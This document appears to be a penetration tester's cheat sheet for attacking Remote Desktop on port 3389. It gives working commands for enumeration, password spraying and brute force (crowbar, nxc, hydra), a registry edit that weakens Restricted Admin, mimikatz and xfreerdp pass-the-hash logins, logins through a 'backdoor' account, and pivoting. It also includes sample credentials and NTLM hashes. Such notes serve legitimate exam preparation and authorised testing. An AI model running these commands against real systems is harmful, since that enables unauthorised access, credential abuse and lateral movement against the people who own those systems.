# RDP Port 3389

##### Enumeration

````
nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 $ip -Pn
````

##### Password Spray

````
crowbar -b rdp -s 10.11.1.7/32 -U users.txt -C rockyou.txt
nxc rdp $ip -u users.txt -p passwords.txt --continue-on-success
nxc rdp $ip -u users.txt -H $HASH --continue-on-success
````

##### Password Cracking

```bash
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
```

#### Check Security Settings

```bash
rdp-sec-check.pl $ip
```

###### logging in

```bash
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0
```

```bash
mimikatz.exe
privilege::debug
sekurlsa::pth /user:kevin /domain:red.local /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:"mstsc.exe /restrictedadmin"
```

```bash
xfreerdp /cert-ignore /bpp:8 /compression -themes -wallpaper /auto-reconnect /h:1000 /w:1600 /v:$ip /u:$user /p:$pass /domain:$dom /drive:SHARE,/opt/windows
xfreerdp /cert-ignore /bpp:8 /compression /auto-reconnect /h:1000 /w:1600 /v:$ip /u:$user /p:$pass /drive:SHARE,/opt/windows
xfreerdp /cert-ignore /bpp:8 /compression -themes -wallpaper /auto-reconnect /h:1000 /w:1600 /v:$ip /u: /p:
xfreerdp /u:admin  /v:192.168.238.191 /cert:ignore /p:"password"  /timeout:20000 /drive:home,/tmp
xfreerdp /v:$ip /u:backdoor /p:Password123 /cert:ignore +clipboard
xfreerdp /v:10.1.1.89 /u:USERX /pth:5e22b03be22022754bf0975251e1e7ac
rdesktop cpub-SkylarkStatus-QuickSessionCollection-CmsRdsh.rdp -u 'kiosk' -p 'XEwUS^9R2Gwt8O914' -g 94% -d SKYLARK
xfreerdp cpub-SkylarkStatus-QuickSessionCollection-CmsRdsh.rdp /d:SKYLARK /u:kiosk /p:XEwUS^9R2Gwt8O914 /auto-reconnect +clipboard
xfreerdp /v:192.168.10.10 /u:alice /pth:[hash] /d:red.com /dynamic-resolution
xfreerdp /v:IPADDRESS /u:USERNAME /p:PASSWORD /d:DOMAIN /drive:SHARE,/path/shared # Mount a share drive for easy transfers
# Remote desktop with 85% screen with a share
rdesktop -u username -p password -g 85% -r disk:share=/opt/ $ip
```

#### Pivot

```bash
Start-Process "$env:windir\system32\mstsc.exe" -ArgumentList "/v:ms01.oscp.exam"
```